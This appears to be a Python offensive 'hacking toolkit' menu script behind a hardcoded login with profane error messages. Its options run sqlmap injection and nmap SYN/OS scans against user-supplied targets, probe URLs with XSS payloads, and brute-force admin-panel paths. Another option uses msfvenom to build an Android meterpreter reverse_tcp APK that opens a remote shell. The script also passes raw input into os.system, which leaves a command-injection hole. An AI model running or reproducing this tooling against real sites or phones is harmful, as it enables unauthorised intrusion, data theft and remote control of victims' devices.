import os
import subprocess
import requests
import sys

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def login():
    username = input("Enter Username: ")
    if username != "Team BD Cyber Ninja":
        print(f"{RED}Wrong username, Fuck You{RESET}")
        sys.exit()
    
    password = input("Enter Password: ")
    if password != "James Arthar RAOHAD":
        print(f"{RED}Wrong password, Fuck You{RESET}")
        sys.exit()
    print(f"{GREEN}Login Successful! Welcome, RAOHAD.{RESET}")

def banner():
    print(r'''
██████   █████   ██████  ██   ██  █████  ██████  
██   ██ ██   ██ ██       ██  ██  ██   ██ ██   ██ 
██   ██ ███████ ██   ███ █████   ███████ ██████  
██   ██ ██   ██ ██    ██ ██   ██  ██   ██ ██      
██████  ██   ██  ██████  ██   ██ ██   ██ ██      
       RAOHAD | Code by James Arthar (RAOHAD)
    ''')

def sqlmap_attack():
    url = input("Target URL (e.g., http://site.com/index.php?id=1): ")
    os.system(f"sqlmap -u \"{url}\" --batch --banner")

def deep_port_scan():
    target = input("Target IP or domain: ")
    os.system(f"nmap -sS -sV -O {target}")

def xss_crawler():
    url = input("Target URL (with param) e.g., http://site.com/index.php?q=: ")
    payloads = ["<script>alert('1')</script>", "'><svg/onload=alert(1)>", "\" onerror=alert(1)"]
    print("[*] Scanning for XSS...")
    for payload in payloads:
        try:
            res = requests.get(url + payload)
            if payload in res.text:
                print(f"[+] Payload worked: {payload}")
        except:
            print(f"[!] Failed with: {payload}")

def admin_panel_scan():
    site = input("Target base URL (e.g., http://site.com/): ")
    try:
        with open("admin_paths.txt", "r") as f:
            paths = f.readlines()
        for path in paths:
            full = site + path.strip()
            try:
                res = requests.get(full)
                if res.status_code == 200:
                    print(f"[+] Admin Found: {full}")
            except: pass
    except:
        print("[!] admin_paths.txt file missing!")

def reverse_ip():
    ip = input("Enter IP: ")
    try:
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}")
        print(r.text)
    except:
        print("[!] Failed to fetch data.")

def whois_lookup():
    domain = input("Enter domain: ")
    os.system(f"whois {domain}")

def payload_gen():
    lhost = input("Enter your IP (LHOST): ")
    lport = input("Enter port (LPORT): ")
    output = input("Enter output name (hack.apk): ")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}")

# Login First
login()

# Main Menu
while True:
    banner()
    print("1. SQL Injection (sqlmap)")
    print("2. Deep Port Scanner (nmap)")
    print("3. XSS Vulnerability Crawler")
    print("4. Admin Panel Finder (100+ paths)")
    print("5. Reverse IP Lookup")
    print("6. Whois Lookup")
    print("7. Android Payload Generator")
    print("8. Exit")
    ch = input("Choose: ")

    if ch == '1': sqlmap_attack()
    elif ch == '2': deep_port_scan()
    elif ch == '3': xss_crawler()
    elif ch == '4': admin_panel_scan()
    elif ch == '5': reverse_ip()
    elif ch == '6': whois_lookup()
    elif ch == '7': payload_gen()
    elif ch == '8': break
    else: print("Invalid option!")